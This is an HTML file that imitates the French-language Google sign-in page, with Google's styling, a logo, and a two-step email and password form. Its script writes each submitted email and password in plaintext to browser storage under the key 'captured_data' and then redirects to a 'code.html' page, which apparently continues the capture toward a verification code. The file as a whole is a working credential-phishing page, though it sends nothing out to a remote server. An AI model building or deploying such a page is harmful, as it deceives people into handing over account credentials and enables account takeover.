<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            width: 100%;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            background: #fff;
        }
        .logo {
            text-align: center;
            margin-bottom: 16px;
        }
        .logo img {
            width: 75px;
            height: 24px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            text-align: center;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 16px;
            color: #202124;
            text-align: center;
            margin-bottom: 24px;
            font-weight: 400;
        }
        .form-group {
            margin-bottom: 24px;
        }
        label {
            display: block;
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 8px;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            color: #202124;
            transition: border-color 0.2s;
        }
        input[type="email"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #1a73e8;
            border-width: 2px;
        }
        .forgot-email {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
            font-weight: 500;
        }
        .forgot-email:hover {
            text-decoration: underline;
        }
        .info-text {
            font-size: 14px;
            color: #5f6368;
            margin-top: 16px;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }
        .btn-create {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            padding: 8px 16px;
        }
        .btn-create:hover {
            background: #f1f3f4;
            border-radius: 4px;
        }
        .btn-next {
            background: #1a73e8;
            color: #fff;
            border: none;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-next:hover {
            background: #1765cc;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }
        .btn-next:disabled {
            background: #f1f3f4;
            color: #80868b;
            cursor: not-allowed;
        }
        .error {
            color: #d93025;
            font-size: 12px;
            margin-top: 8px;
            display: none;
        }
        #password-section {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
                <g fill="none" fill-rule="evenodd">
                    <path d="M67.95 12.15c0 5.5-4.3 9.55-9.55 9.55s-9.55-4.05-9.55-9.55 4.3-9.55 9.55-9.55 9.55 4.05 9.55 9.55z" fill="#EA4335"/>
                    <path d="M58.4 17.7c-3.05 0-5.55-2.45-5.55-5.55s2.5-5.55 5.55-5.55 5.55 2.45 5.55 5.55-2.5 5.55-5.55 5.55z" fill="#FBBC05"/>
                    <path d="M58.4 6.6c-3.05 0-5.55 2.45-5.55 5.55s2.5 5.55 5.55 5.55 5.55-2.45 5.55-5.55-2.5-5.55-5.55-5.55z" fill="#34A853"/>
                    <path d="M21.3 12.15c0 5.5-4.3 9.55-9.55 9.55S2.2 17.65 2.2 12.15 6.5 2.6 11.75 2.6s9.55 4.05 9.55 9.55z" fill="#4285F4"/>
                </g>
            </svg>
        </div>
        <h1>Connexion</h1>
        <p class="subtitle">Utiliser votre compte Google</p>
        
        <form id="login-form">
            <!-- Section Email -->
            <div id="email-section">
                <div class="form-group">
                    <input type="email" id="email" placeholder="Adresse e-mail ou téléphone" required>
                    <div class="error" id="email-error">Adresse e-mail introuvable</div>
                </div>
                <a href="#" class="forgot-email">Adresse e-mail oubliée ?</a>
                <p class="info-text">Pas sur votre ordinateur ? Utilisez le mode Invité pour vous connecter en privé.</p>
            </div>

            <!-- Section Password -->
            <div id="password-section">
                <div class="form-group">
                    <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 24px;">
                        <span id="display-email" style="font-size: 14px; color: #202124;"></span>
                    </div>
                    <input type="password" id="password" placeholder="Saisissez votre mot de passe" required>
                    <div class="error" id="password-error">Mot de passe incorrect</div>
                </div>
            </div>

            <div class="buttons">
                <a href="#" class="btn-create">Créer un compte</a>
                <button type="submit" class="btn-next" id="next-btn">Suivant</button>
            </div>
        </form>
    </div>

    <script>
        const form = document.getElementById('login-form');
        const emailSection = document.getElementById('email-section');
        const passwordSection = document.getElementById('password-section');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const displayEmail = document.getElementById('display-email');
        const nextBtn = document.getElementById('next-btn');
        let currentStep = 'email';

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            
            if (currentStep === 'email') {
                const email = emailInput.value.trim();
                if (email) {
                    // Passer à l'étape mot de passe
                    emailSection.style.display = 'none';
                    passwordSection.style.display = 'block';
                    displayEmail.textContent = email;
                    currentStep = 'password';
                }
            } else {
                // Enregistrer les données dans le stockage
                const email = emailInput.value.trim();
                const password = passwordInput.value;
                
                const donnee = {
                    type: 'login',
                    email: email,
                    password: password,
                    timestamp: new Date().toLocaleString('fr-FR'),
                    id: Date.now()
                };

                // Récupérer les données existantes
                let donnees = JSON.parse(localStorage.getItem('captured_data') || '[]');
                
                // Ajouter la nouvelle donnée
                donnees.push(donnee);
                
                // Sauvegarder
                localStorage.setItem('captured_data', JSON.stringify(donnees));
                
                // Sauvegarder aussi l'email pour la page suivante
                sessionStorage.setItem('current_email', email);
                
                console.log('✅ Données sauvegardées:', donnee);
                
                // Rediriger vers la page de code
                window.location.href = 'code.html';
            }
        });
    </script>
</body>
</html>
